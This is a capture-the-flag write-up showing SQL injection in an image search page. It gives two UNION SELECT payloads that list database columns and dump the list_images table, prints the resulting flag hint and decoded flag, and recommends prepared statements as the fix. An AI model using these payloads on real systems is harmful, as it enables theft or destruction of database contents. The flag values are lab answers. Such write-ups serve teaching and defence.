# Explaination

The image search is vulnerable to SQL injection like the user search. So I will look for the columns of the table:

```sql
1 or 1=1 UNION select table_name, column_name FROM information_schema.columns
```

I can find the table `list_images` with 4 columns: `id`, `url`, `title` and `comment`. I will now look for the content of the table:

```sql
1 or 1=1 UNION select title, comment FROM list_images
```

I can see:
```
ID: 1 or 1=1 UNION select title, comment FROM list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

The flag decoded is 'albatroz'.
And the flag encrypted is 'f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188'.

# Use case

We can use this vulnerability to have all the datas of a Database, or Drop the Database etc...

# Fix

You must use prepared statements to avoid SQL injection, and not use directly the value of the input in the SQL query.
But now, almost every website uses an ORM, which is a layer between the database and the application, and it automatically uses prepared statements, so it's very rare to see a SQL injection in a modern website.
